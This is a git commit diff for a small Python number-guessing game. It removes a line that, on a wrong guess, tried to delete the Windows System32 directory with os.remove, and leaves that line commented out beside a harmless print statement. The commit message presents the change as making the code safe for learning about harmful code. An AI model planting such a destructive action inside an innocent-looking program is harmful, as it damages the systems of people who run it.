648fcf7d889ba882de6242ebc9fc0428495d8b74
MischievousRay <148750307+MischievousRayIsDead@users.noreply.github.com>
2024-05-26 03:31:45 +0530

    Update Guessing_Game.py
    commented out the malicious part for providing a safe experience for others to learn abut harmful code.

--- Guessing_Game.py
+++ Guessing_Game.py
@@ -3,10 +3,11 @@ import os
 
 number = random.randint(1,10)
 
-guess = input("Silly game! Guess number between 1 to 10")
+guess = input("Guess number between 1 to 10")
 guess = int(guess)
 
 if guess == number:
     print("you won!")
 else:
-    os.remove("C:\Windows\System32")
+    # os.remove("C:\\Windows\\System32")
+    print("This is where a malicious action could occur, such as deleting system files.")
